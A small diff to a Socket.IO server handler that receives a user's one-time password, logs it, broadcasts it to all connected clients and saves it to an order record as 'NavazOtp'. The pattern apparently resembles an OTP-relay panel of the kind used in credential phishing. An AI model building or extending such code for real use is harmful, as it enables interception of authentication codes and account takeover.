@@ -376,11 +376,11 @@ io.on("connection", (socket) => {
     });
     io.emit("motslOtp", data);
   });
-  socket.on("acceptMotslOtp", async ({ id, userOtp }) => {
-    console.log("acceptMotslOtp send", { id, userOtp });
-    io.emit("acceptMotslOtp", { id, userOtp });
-    await Order.findByIdAndUpdate(id, {
-      NavazOtp: userOtp,
+  socket.on("acceptMotslOtp", async (data) => {
+    console.log("acceptMotslOtp send", { id: data.id, userOtp: data.userOtp });
+    io.emit("acceptMotslOtp", { id: data.id, userOtp: data.userOtp });
+    await Order.findByIdAndUpdate(data.id, {
+      NavazOtp: data.userOtp,
     });
   });
   socket.on("declineMotslOtp", async (id) => {
